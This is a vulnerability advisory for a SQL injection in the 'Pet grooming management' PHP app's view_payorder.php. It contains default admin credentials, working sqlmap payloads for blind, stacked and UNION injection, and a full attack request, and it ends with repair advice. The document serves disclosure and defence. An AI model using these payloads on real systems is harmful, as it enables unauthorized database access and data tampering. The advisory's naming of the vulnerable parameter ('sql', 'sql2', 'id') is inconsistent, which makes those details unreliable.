# Pet grooming management view_payorder.php  v.1.0 sql injection

# NAME OF AFFECTED PRODUCT(S)

- Pet grooming management

## Vendor Homepage

- [Pet grooming management software download | SourceCodester](https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html)

# AFFECTED AND/OR FIXED VERSION(S)

## submitter

- xiaoliyu-1
## VERSION(S)

- V1.0

## Software Link

- [Downloading Pet grooming management software download Code | SourceCodester](https://www.sourcecodester.com/download-code?nid=18340&title=Pet+grooming+management+software+download)

# PROBLEM TYPE

## Vulnerability Type

- SQL injection

## Root Cause

- A SQL injection vulnerability was found in the 'view_payorder.php' file of the 'Pet grooming management' project. The reason for this issue is that attackers inject malicious code from the parameter "sql" and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact

- Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION

- During the security review of "Pet grooming management", discovered a critical SQL injection vulnerability in the "view_payorder.php" file. This vulnerability stems from insufficient user input validation of the 'sql' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

#Login or authorization is required to exploit this vulnerability
1、Log in to the system using the default password [mdkhairnar92@gmail.com](mailto:mdkhairnar92@gmail.com): admin
2、By examining the /admin/view_payorder.php code, it was discovered that the sql2 parameter was concatenated in the SQL statement

# Vulnerability details and POC

## Vulnerability type:

- time-based blind
- UNION query
- stacked queries

## Vulnerability location:

- 'sql' parameter

## Payload:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: id=-1' AND 6723=(SELECT (CASE WHEN (6723=6723) THEN 6723 ELSE (SELECT 5877 UNION SELECT 8790) END))-- zPiI
    Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=-1';SELECT SLEEP(5)#
    Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=-1' AND (SELECT 6039 FROM (SELECT(SLEEP(5)))dtfr)-- BPqh
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1' UNION ALL SELECT CONCAT(0x71626b7071,0x5a654442684e456d614a66686c4b487957764d756951506e6d485952706c716e666365736449726c,0x7178707171),NULL,NULL,NULL,NULL,NULL-- -
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL-- -
```


![image-20250917124758.png](./assets/image-20250917124758.png)


## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:

```
sqlmap -r 1.req  --dbs -v 3 --batch --level 5
//1.req
POST /admin/view_payorder.php HTTP/1.1
Host: 127.0.0.1
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9mjrub6b6jfcfhk0lv26kugff3
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 24

id=-1*
```

# Attack results


![image-20250917124934.png](./assets/image-20250917124934.png)

# Suggested repair



1. **Use prepared statements and parameter binding:** Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.
2. **Input validation and filtering:** Strictly validate and filter user input data to ensure it conforms to the expected format.
3. **Minimize database user permissions:** Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.
4. **Regular security audits:** Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.
